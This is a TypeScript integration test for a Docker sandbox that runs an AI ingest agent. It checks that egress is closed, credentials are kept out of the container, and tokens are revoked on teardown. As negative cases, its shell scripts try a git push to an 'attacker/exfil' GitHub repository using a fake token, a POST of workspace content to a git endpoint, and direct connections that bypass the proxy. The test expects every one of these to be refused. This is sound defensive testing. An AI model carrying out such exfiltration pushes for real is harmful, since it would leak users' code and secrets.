import { execFile } from "node:child_process"
import { randomUUID } from "node:crypto"
import { createServer } from "node:http"
import type { AddressInfo } from "node:net"
import { promisify } from "node:util"

import { OpenAPIHono } from "@hono/zod-openapi"
import { and, eq } from "drizzle-orm"
import { HttpResponse, http } from "msw"
import { setupServer } from "msw/node"
import { BackendPostgres } from "openworkflow/postgres"
import {
  afterAll,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest"

import type { AppEnv } from "../../app/env.js"
import { parseEnv } from "../../config/env.js"
import {
  closeDb,
  getSystemDb,
  initDb,
  withOrgDbContext,
} from "../../db/client.js"
import { organizations } from "../../db/schema/auth.js"
import { connections } from "../../db/schema/connections.js"
import { sandboxLocks } from "../../db/schema/sandbox-locks.js"
import { generateObjectId } from "../../lib/id.js"
import { sandboxGitTokenStore } from "../../models/sandbox-git-tokens.js"
import { openWorkflowNamespaceId } from "../../openworkflow/namespace.js"
import { workspaceChatOpenaiRoutes } from "../../routes/v1/workspace-chat-openai.js"
import { withAgentVault } from "../../test/agent-vault-fixture.js"
import { listenWithDockerOutsideMsw } from "../../test/docker-outside-msw.js"
import {
  contextStorage,
  withTestRequestLogger,
} from "../../test/hono-test-logger.js"
import {
  type GithubTokenLog,
  githubTokenHandlers,
  insertGithubConnection,
  stubGithubApp,
} from "../../test/ingest-github.js"
import {
  ingestModelRunCommand,
  parseOpenCodeUsage,
} from "../ingestion/ingest-opencode-usage.js"
import {
  ingestAgentCommand,
  ingestOpenCodeConfig,
} from "../ingestion/ingest-opencode.js"
import { prepareIngestSandbox } from "../ingestion/ingest-prepare.js"
import { dockerRootExec } from "../ingestion/ingest-root.js"
import {
  ingestAgentEnv,
  probeIngestModelProxy,
} from "../ingestion/ingest-shard-ops.js"
import {
  INGEST_TOOL_BRIDGE_PATH,
  ingestToolBridgeRoutes,
} from "../ingestion/ingest-tools.js"
import {
  INGESTION_V2_WORKFLOW_NAME,
  type IngestionV2RunInput,
} from "../ingestion/ingestion-run.js"
import { setRunVaultRules } from "./agent-vault.js"
import { ingestSandboxThreadId } from "./chat-lifecycle.js"
import { workspaceChatDockerImage } from "./chat-runtime.js"
import {
  dockerIngestSandboxProvider,
  type IngestEgress,
  ingestCredentialRules,
  refreshIngestSandboxEgress,
} from "./ingest-sandbox-egress.js"
import { workspaceChatCompletionsPath } from "./workspace-chat-model-proxy.js"
import { mintWorkspaceIngestRunCapability } from "./workspace-chat-run-capability.js"

const exec = promisify(execFile)
const image = workspaceChatDockerImage()
const orgId = generateObjectId("org")
const connectionId = generateObjectId("con")
const log: GithubTokenLog = { minted: [], revoked: [] }
/** The token GitHub mints; the test Git server takes it (set per fixture). */
let gitToken = ""
const github = setupServer(...githubTokenHandlers(log, () => gitToken))

beforeAll(async () => {
  const url = process.env.DATABASE_URL
  if (!url) throw new Error("DATABASE_URL is required for ingest tokens")
  initDb(url)
  stubGithubApp()
  // Agent Vault (localhost) and Docker pass through; GitHub is msw.
  listenWithDockerOutsideMsw(github, { onUnhandledRequest: "bypass" })
  await getSystemDb().insert(organizations).values({
    id: orgId,
    slug: orgId,
    name: "Ingest egress proof",
    createdAt: new Date(),
  })
  // The test Git server serves `git/repo`: the installation's account is `git`.
  await insertGithubConnection({
    orgId,
    id: connectionId,
    installationId: 333,
    accountSlug: "git",
  })
})

beforeEach(() => {
  log.minted.length = 0
  log.revoked.length = 0
})

afterAll(async () => {
  github.close()
  vi.unstubAllEnvs()
  const store = sandboxGitTokenStore(orgId, parseEnv(process.env))
  for (const row of await store.list("ingest:")) await store.take(row.key)
  await withOrgDbContext(orgId, (db) =>
    db.delete(connections).where(eq(connections.orgId, orgId)),
  )
  await getSystemDb().delete(organizations).where(eq(organizations.id, orgId))
  await closeDb()
})

/** The sections of a script's output, split at `== <name>` lines. */
function sections(stdout: string): Record<string, string> {
  return Object.fromEntries(
    stdout
      .split("== ")
      .filter(Boolean)
      .map((section) => {
        const [name, ...rest] = section.split("\n")
        return [name, rest.join("\n").trim()]
      }),
  )
}

async function run(container: string, script: string): Promise<string> {
  const { stdout } = await exec(
    "docker",
    ["exec", container, "sh", "-c", script],
    { timeout: 120_000 },
  )
  return stdout
}

async function containerExists(id: string): Promise<boolean> {
  return exec("docker", ["inspect", id]).then(
    () => true,
    () => false,
  )
}

const code = (args: string) =>
  `curl -sS -m 20 -o /dev/null -w "%{http_code}" ${args} 2>/dev/null || true`

/** The model provider behind the backend model proxy (msw). */
const MODEL_PROVIDER_URL = "http://model-provider.test/v1"

/**
 * The backend's model proxy and ingest tool bridge on a port of this
 * machine, as Compose serves them to Agent Vault on the `sandbox` network.
 */
async function serveBackend(): Promise<{
  port: number
  close: () => Promise<void>
}> {
  const env = parseEnv({
    ...process.env,
    MODEL_PROVIDER: "openai-like",
    MODEL_PROVIDER_URL,
    MODEL_PROVIDER_API_KEY: "sk-upstream",
    MODEL_FAST_NAME: "test/model-fast",
  })
  const app = new OpenAPIHono<AppEnv>()
  app.use(contextStorage())
  app.use(withTestRequestLogger)
  app.use("*", async (c, next) => {
    c.set("env", env)
    await next()
  })
  app.route(
    "/:orgSlug/api/v1/workspace-chat/openai",
    new OpenAPIHono<AppEnv>().route("/", workspaceChatOpenaiRoutes),
  )
  app.route("/", ingestToolBridgeRoutes)
  const server = createServer(async (req, res) => {
    const chunks: Buffer[] = []
    for await (const chunk of req) chunks.push(chunk as Buffer)
    const headers = new Headers()
    for (let i = 0; i < req.rawHeaders.length; i += 2)
      headers.append(req.rawHeaders[i] ?? "", req.rawHeaders[i + 1] ?? "")
    const response = await app.fetch(
      new Request(`http://backend.test${req.url}`, {
        method: req.method,
        headers,
        ...(req.method === "GET" || req.method === "HEAD"
          ? {}
          : { body: Buffer.concat(chunks) }),
      }),
    )
    res.writeHead(response.status, Object.fromEntries(response.headers))
    const reader = response.body?.getReader()
    for (;;) {
      const next = await reader?.read()
      if (!next || next.done) break
      res.write(next.value)
    }
    res.end()
  })
  await new Promise<void>((resolve) => server.listen(0, "0.0.0.0", resolve))
  return {
    port: (server.address() as AddressInfo).port,
    close: () => new Promise((resolve) => server.close(() => resolve())),
  }
}

/** One streamed answer of an OpenAI-compatible provider, with its usage. */
function streamedAnswer(): Response {
  const chunk = (body: object) => `data: ${JSON.stringify(body)}\n\n`
  const base = {
    id: "c",
    object: "chat.completion.chunk",
    created: 1,
    model: "test",
  }
  return new HttpResponse(
    [
      chunk({
        ...base,
        choices: [
          {
            index: 0,
            delta: { role: "assistant", content: "done" },
            finish_reason: null,
          },
        ],
      }),
      chunk({
        ...base,
        choices: [{ index: 0, delta: {}, finish_reason: "stop" }],
      }),
      chunk({
        ...base,
        choices: [],
        usage: { prompt_tokens: 100, completion_tokens: 10, total_tokens: 110 },
      }),
      "data: [DONE]\n\n",
    ].join(""),
    { headers: { "content-type": "text/event-stream" } },
  )
}

describe("the Docker ingest sandbox has closed egress", () => {
  it(
    "reaches only the model proxy, the tool bridge and Git fetch; destroy deletes the vault and always revokes the token",
    { timeout: 300_000 },
    async () => {
      // The AWS sandbox host (DOCKER-USER rules) and DinD (the mangle rules
      // of scripts/sandbox-dind/entrypoint.sh) drop each direct connection.
      // Here the provider moves the sandbox to an internal network that
      // reaches only the proxy port, which has the same effect.
      await withAgentVault({ image, closed: true }, async (fixture) => {
        gitToken = fixture.gitToken
        const base = `http://${fixture.upstream}:8080`
        const plain = `https://${fixture.upstream}`
        const runId = `run_${crypto.randomUUID()}`
        const egress = (
          step: number,
          repositories: IngestEgress["repositories"] = [
            { fullName: "git/repo", githubConnectionId: connectionId },
            // A public plain git source: fetch with no credential, over
            // HTTPS on 443, only while prepare fetches it (CTX-815).
            {
              kind: "git",
              host: fixture.upstream,
              path: "/public/repo.git",
            },
          ],
        ): IngestEgress => ({
          repositories,
          gitHost: `${fixture.upstream}:8080`,
          modelProxyUrl: `${base}/echo/model/v1`,
          capability: `ingest-capability-${step}`,
          bridge: { url: `${base}/echo/bridge`, token: `bridge-${step}` },
        })
        const shard = { orgId, runId, shard: 0, access: fixture.access }
        const provider = dockerIngestSandboxProvider({
          ...shard,
          image,
          egress: egress(1),
          network: fixture.sandboxNetwork,
        })
        const handle = await provider.create({})
        let destroyed = false
        try {
          const output = await run(
            handle.id,
            `echo "== model"
curl -sS -m 20 -X POST ${base}/echo/model/v1/chat/completions
echo
echo "== models"
curl -sS -m 20 ${base}/echo/model/v1/models
echo
echo "== bridge"
curl -sS -m 20 ${base}/echo/bridge
echo
echo "== fetch"
git clone -q ${base}/git/repo.git /tmp/clone 2>&1 && git -C /tmp/clone fetch -q origin 2>&1 && git -C /tmp/clone log --format=%s
echo "== push"
cd /tmp/clone && git -c user.name=t -c user.email=t@t commit -q --allow-empty -m change
git push origin HEAD:refs/ctxpipe/ingest/${runId}/ws 2>&1 && echo PUSHED || echo REFUSED
echo "== github-push"
git push https://x-access-token:ghp_attacker@github.com/attacker/exfil.git HEAD:refs/heads/x 2>&1 && echo PUSHED || echo REFUSED
cd /
echo "== github-receive-pack"
${code("-X POST https://github.com/octocat/hello-world.git/git-receive-pack")}
echo
echo "== github-api"
${code("https://api.github.com/user")}
echo
echo "== example"
${code("https://example.com/")}
echo
echo "== example-http"
${code("http://example.com/")}
echo
echo "== other-path"
${code(`${base}/echo/other`)}
echo
echo "== plain-fetch"
git ls-remote ${plain}/public/repo.git refs/heads/main 2>&1 | cut -f2
echo "== plain-other-path"
${code(`${plain}/public/other.git/info/refs?service=git-upload-pack`)}
echo
echo "== plain-other-port"
${code(`${base}/public/repo.git/info/refs?service=git-upload-pack`)}
echo
echo "== plain-other-host"
${code("https://example.com/public/repo.git/info/refs?service=git-upload-pack")}
echo
echo "== plain-push"
cd /tmp/clone && git push ${plain}/public/repo.git HEAD:refs/heads/plain-push 2>&1 && echo PUSHED || echo REFUSED
cd /
echo
echo "== direct"
${code("--noproxy '*' https://example.com/")}
echo
`,
          )
          const result = sections(output)
          expect(
            JSON.parse(result.model ?? "{}").headers?.authorization,
            output,
          ).toBe("Bearer ingest-capability-1")
          expect(
            JSON.parse(result.models ?? "{}").headers?.authorization,
            output,
          ).toBe("Bearer ingest-capability-1")
          expect(
            JSON.parse(result.bridge ?? "{}").headers?.authorization,
            output,
          ).toBe("Bearer bridge-1")
          expect(result.fetch, output).toBe("seed")
          // The vault refuses the push; the Git server would take it.
          expect(result.push, output).toContain("403")
          expect(result.push, output).toContain("REFUSED")
          expect(result["github-push"], output).toContain("REFUSED")
          // The plain git source: only Git fetch of its own path, with no
          // credential. The Git server would take the push with no auth.
          expect(result["plain-fetch"], output).toBe("refs/heads/main")
          expect(result["plain-other-path"], output).toBe("403")
          // The rule matches only port 443: the HTTP server on 8080 serves
          // the same path, and the vault refuses it.
          expect(result["plain-other-port"], output).toBe("403")
          expect(result["plain-other-host"], output).toBe("403")
          expect(result["plain-push"], output).toContain("REFUSED")
          for (const name of [
            "github-receive-pack",
            "github-api",
            "example",
            "example-http",
            "other-path",
          ])
            expect(result[name], `${name}\n${output}`).toBe("403")
          expect(result.direct, output).toBe("000")
          // GitHub minted one read token for the installation's repository.
          expect(log.minted).toEqual([
            { installationId: 333, repositories: ["repo"] },
          ])
          // No credential is in the sandbox's environment.
          const environ = await run(handle.id, "env")
          expect(environ).not.toContain(fixture.gitToken)
          expect(environ).not.toContain("ingest-capability-1")
          expect(environ).not.toContain("bridge-1")

          // The next step gets its own capability; the first one is gone.
          await refreshIngestSandboxEgress({ ...shard, egress: egress(2) })
          const next = await run(
            handle.id,
            `curl -sS -m 20 -X POST ${base}/echo/model/v1/chat/completions`,
          )
          expect(JSON.parse(next).headers?.authorization).toBe(
            "Bearer ingest-capability-2",
          )
          // One token per 50-minute window: the refresh reused it.
          expect(log.minted).toHaveLength(1)
          // A step after prepare cannot reach the plain git host: no GET,
          // and no POST that could carry Workspace content out.
          const stepPlain = sections(
            await run(
              handle.id,
              `echo "== get"
${code(`${plain}/public/repo.git/info/refs?service=git-upload-pack`)}
echo
echo "== post"
${code(`-X POST --data-binary 'Workspace content' -H 'content-type: application/x-git-upload-pack-request' ${plain}/public/repo.git/git-upload-pack`)}
echo`,
            ),
          )
          expect(stepPlain.get).toBe("403")
          expect(stepPlain.post).toBe("403")

          // A step that lists no repository cannot fetch one.
          await refreshIngestSandboxEgress({ ...shard, egress: egress(3, []) })
          const fetchAfter = await run(
            handle.id,
            `git -C /tmp/clone fetch -q origin 2>&1 && echo FETCHED || echo REFUSED`,
          )
          expect(fetchAfter).toContain("REFUSED")

          await provider.destroy({ id: handle.id })
          destroyed = true
          expect(await containerExists(handle.id)).toBe(false)
          expect(log.revoked).toEqual([fixture.gitToken])
          const store = sandboxGitTokenStore(orgId, parseEnv(process.env))
          expect(
            await store.list(`${ingestSandboxThreadId(runId, 0)}:`),
          ).toEqual([])
          // The vault is gone: a later step cannot set rules on it.
          await expect(
            setRunVaultRules(
              fixture.access,
              ingestSandboxThreadId(runId, 0),
              ingestCredentialRules(egress(4), []),
            ),
          ).rejects.toBeTruthy()
        } finally {
          if (!destroyed)
            await provider.destroy({ id: handle.id }).catch(() => undefined)
        }

        // Destroy revokes the token also when the vault delete fails.
        log.revoked.length = 0
        const second = dockerIngestSandboxProvider({
          ...shard,
          shard: 1,
          image,
          egress: egress(1),
          network: fixture.sandboxNetwork,
        })
        const kept = await second.create({})
        await fixture.stopAgentVault()
        await expect(second.destroy({ id: kept.id })).rejects.toBeTruthy()
        expect(await containerExists(kept.id)).toBe(false)
        expect(log.revoked).toEqual([fixture.gitToken])
      })
    },
  )

  it(
    "an ingest model step reaches the model through Agent Vault and the backend model proxy",
    { timeout: 480_000 },
    async () => {
      const upstreamCalls: string[] = []
      github.use(
        http.post(`${MODEL_PROVIDER_URL}/chat/completions`, ({ request }) => {
          upstreamCalls.push(request.headers.get("authorization") ?? "")
          return streamedAnswer()
        }),
      )
      const backend = await serveBackend()
      const workflows = await BackendPostgres.connect(
        process.env.DATABASE_URL ?? "",
        { runMigrations: false, namespaceId: openWorkflowNamespaceId() },
      )
      const run = await workflows.createWorkflowRun({
        workflowName: INGESTION_V2_WORKFLOW_NAME,
        version: null,
        idempotencyKey: null,
        config: {},
        context: null,
        input: { orgId, shadow: true } satisfies IngestionV2RunInput,
        parentStepAttemptNamespaceId: null,
        parentStepAttemptId: null,
        // Never due: no worker claims it.
        availableAt: new Date(Date.now() + 365 * 24 * 60 * 60_000),
        deadlineAt: null,
      })
      const lockKey = ingestSandboxThreadId(run.id, 0)
      const lockOwner = randomUUID()
      try {
        // The step holds the shard lock, as `withShardLock` does.
        await withOrgDbContext(orgId, (db) =>
          db.insert(sandboxLocks).values({
            orgId,
            key: lockKey,
            owner: lockOwner,
            expiresAt: new Date(Date.now() + 10 * 60_000),
          }),
        )
        await withAgentVault(
          { image, closed: true, backendPort: backend.port },
          async (fixture) => {
            // The origin of the backend as the sandbox sees it (Compose:
            // `http://backend.sandbox.ctxpipe.internal:3000`).
            const origin = `http://${fixture.upstream}:3000`
            const modelProxyUrl = `${origin}${workspaceChatCompletionsPath(orgId)}`
            const provider = dockerIngestSandboxProvider({
              orgId,
              runId: run.id,
              shard: 0,
              image,
              access: fixture.access,
              network: fixture.sandboxNetwork,
              egress: {
                repositories: [],
                modelProxyUrl,
                capability: await mintWorkspaceIngestRunCapability({
                  authSecret: parseEnv(process.env).AUTH_SECRET,
                  orgId,
                  orgSlug: orgId,
                  runId: run.id,
                  shard: 0,
                  step: "skill:repository:decisions",
                  lockOwner,
                }),
                bridge: {
                  url: `${origin}${INGEST_TOOL_BRIDGE_PATH}`,
                  token: "ctxpipe-no-tools",
                },
              },
            })
            const handle = await provider.create({})
            try {
              const root = dockerRootExec(handle.id)
              const agentEnv = await ingestAgentEnv(root, { modelProxyUrl })
              await prepareIngestSandbox(handle, root, {
                bundle: { name: "ingest-test", skills: [], files: [] },
                opencodeConfig: ingestOpenCodeConfig({
                  modelBase: "test/model-medium",
                  models: ["test/model-fast"],
                  skills: [],
                  proxyAddsCredentials: true,
                  toolBridgeUrl: `${origin}${INGEST_TOOL_BRIDGE_PATH}`,
                }),
              })
              // The probe that prepare logs before the first model step.
              const probe = await probeIngestModelProxy(root, agentEnv)
              // The model command of a step, as the agent, with the step's
              // environment (`runIngestShardStep`). A model path that does
              // not answer ends here, not at the 10-minute step limit.
              const result = await root(
                ingestAgentCommand({
                  env: agentEnv,
                  command: ingestModelRunCommand({
                    prompt: "Say done.",
                    model: "ctxpipe/test/model-fast",
                  }),
                }),
                { signal: AbortSignal.timeout(240_000) },
              ).catch((error: unknown) => ({
                exitCode: -2,
                stdout: "",
                stderr: String(error),
              }))
              const diagnosis =
                result.exitCode === 0
                  ? ""
                  : (
                      await root(
                        `echo "probe ${probe}; exit ${result.exitCode}: ${result.stderr.slice(-400).replace(/["$`\\]/g, "")}"
echo "== curl models as the agent"
${ingestAgentCommand({ env: agentEnv, command: `curl -sS -m 20 -w " %{http_code}" "$CTXPIPE_MODEL_PROXY_URL/models" 2>&1` })}
echo "== opencode log"
tail -c 6000 /ctxpipe/home/data/opencode/log/*.log 2>&1`,
                      )
                    ).stdout
              expect(probe, diagnosis).toBe("200")
              expect(result.exitCode, diagnosis).toBe(0)
              expect(parseOpenCodeUsage(result.stdout), diagnosis).toEqual({
                inputTokens: 100,
                outputTokens: 10,
              })
              // The backend added the provider key; the sandbox never had it.
              expect(upstreamCalls, diagnosis).toEqual(["Bearer sk-upstream"])
            } finally {
              await provider.destroy({ id: handle.id }).catch(() => undefined)
            }
          },
        )
      } finally {
        github.resetHandlers()
        await withOrgDbContext(orgId, (db) =>
          db
            .delete(sandboxLocks)
            .where(
              and(eq(sandboxLocks.orgId, orgId), eq(sandboxLocks.key, lockKey)),
            ),
        )
        await workflows.stop()
        await backend.close()
      }
    },
  )

  it(
    "self-host: fetches an http:// plain git source on a private address and another port through Agent Vault",
    { timeout: 300_000 },
    async () => {
      // The upstream has a private address on the test network, and the
      // fixture puts it in AGENT_VAULT_NETWORK_ALLOWLIST. An operator does the
      // same for a private git server: the Compose variable, or
      // `sandboxHost.agentVaultNetworkAllowlist` on AWS CDK.
      await withAgentVault({ image, closed: true }, async (fixture) => {
        gitToken = fixture.gitToken
        const base = `http://${fixture.upstream}:8080`
        const source = `${base}/public/repo.git`
        const provider = dockerIngestSandboxProvider({
          orgId,
          runId: `run_${crypto.randomUUID()}`,
          shard: 3,
          image,
          access: fixture.access,
          network: fixture.sandboxNetwork,
          egress: {
            repositories: [
              {
                kind: "git",
                host: fixture.upstream,
                path: "/public/repo.git",
                port: 8080,
              },
            ],
            gitHost: `${fixture.upstream}:8080`,
            modelProxyUrl: `${base}/echo/model/v1`,
            capability: "ingest-capability",
            bridge: { url: `${base}/echo/bridge`, token: "bridge" },
          },
        })
        const handle = await provider.create({})
        try {
          const output = await run(
            handle.id,
            `echo "== fetch"
git ls-remote ${source} refs/heads/main 2>&1 | cut -f2
echo "== clone"
git clone -q ${source} /tmp/plain 2>&1 && git -C /tmp/plain log --format=%s
echo "== other-path"
${code(`${base}/public/other.git/info/refs?service=git-upload-pack`)}
echo
echo "== push"
cd /tmp/plain && git -c user.name=t -c user.email=t@t commit -q --allow-empty -m change
git push ${source} HEAD:refs/heads/plain-push 2>&1 && echo PUSHED || echo REFUSED
`,
          )
          const result = sections(output)
          // Git fetch of the source path only, over http on its own port,
          // with no credential. The Git server would take the push.
          expect(result.fetch, output).toBe("refs/heads/main")
          expect(result.clone, output).toBe("seed")
          expect(result["other-path"], output).toBe("403")
          expect(result.push, output).toContain("REFUSED")
          // A plain git source mints no GitHub token.
          expect(log.minted).toEqual([])
        } finally {
          await provider.destroy({ id: handle.id }).catch(() => undefined)
        }
      })
    },
  )

  it(
    "fails closed: no Agent Vault, or a host that does not force the proxy, means no sandbox and a revoked token",
    { timeout: 180_000 },
    async () => {
      const repositories = [
        { fullName: "git/repo", githubConnectionId: connectionId },
      ]
      const address = process.env.AGENT_VAULT_ADDR
      vi.stubEnv("AGENT_VAULT_ADDR", "")
      try {
        await expect(
          dockerIngestSandboxProvider({
            orgId,
            runId: `run_${crypto.randomUUID()}`,
            shard: 0,
            image,
            egress: {
              repositories,
              modelProxyUrl: "http://x.test/v1",
              capability: "c",
              bridge: { url: "http://x.test/b", token: "t" },
            },
          }).create({}),
        ).rejects.toThrow("Agent Vault")
      } finally {
        vi.stubEnv("AGENT_VAULT_ADDR", address)
      }
      expect(log.minted).toEqual([])

      // Host dev: the default bridge network reaches the internet directly.
      await withAgentVault({ image }, async (fixture) => {
        gitToken = fixture.gitToken
        const runId = `run_${crypto.randomUUID()}`
        const open = dockerIngestSandboxProvider({
          orgId,
          runId,
          shard: 2,
          image,
          access: fixture.access,
          egress: {
            repositories,
            gitHost: `${fixture.upstream}:8080`,
            modelProxyUrl: `http://${fixture.upstream}:8080/echo/model/v1`,
            capability: "ingest-capability",
            bridge: {
              url: `http://${fixture.upstream}:8080/echo/bridge`,
              token: "bridge",
            },
          },
        })
        await expect(open.create({})).rejects.toThrow(
          "need a host that forces each connection through Agent Vault",
        )
        expect(log.revoked).toEqual([fixture.gitToken])
        await expect(
          setRunVaultRules(
            fixture.access,
            ingestSandboxThreadId(runId, 2),
            ingestCredentialRules(
              {
                repositories: [],
                modelProxyUrl: "http://x.test/v1",
                capability: "c",
                bridge: { url: "http://x.test/b", token: "t" },
              },
              [],
            ),
          ),
        ).rejects.toBeTruthy()
      })
    },
  )
})
